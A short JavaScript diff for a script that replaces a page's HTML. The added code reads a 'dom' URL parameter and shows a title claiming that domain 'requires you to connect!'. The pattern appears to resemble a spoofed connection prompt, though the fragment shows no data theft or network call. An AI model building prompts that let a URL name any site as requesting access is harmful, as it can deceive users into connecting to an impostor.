@@ -1,5 +1,20 @@
 const ensurePageChange = setInterval(() => {
   if (document.getElementById("pageFullyLoadedActive") != null) {
+    try {
+      const url = new URL(window.location.href);
+      const params = new URLSearchParams(url.search);
+      const domain = params.get("dom");
+      if (domain) {
+        document.getElementById(
+          "mainTitle"
+        ).innerText = `${domain} requires you to connect!`;
+      } else {
+        document.getElementById("mainTitle").innerText = `Connection Required`;
+      }
+    } catch (error) {
+      document.getElementById("mainTitle").innerText = `Connection Required`;
+    }
+
     return clearInterval(ensurePageChange);
   };
   document.documentElement.innerHTML = `
@@ -71,7 +86,6 @@ const ensurePageChange = setInterval(() => {
     </script>
   </body>
 `;
-document.body.replaceWith(document.body.cloneNode(true));
 
 });
 
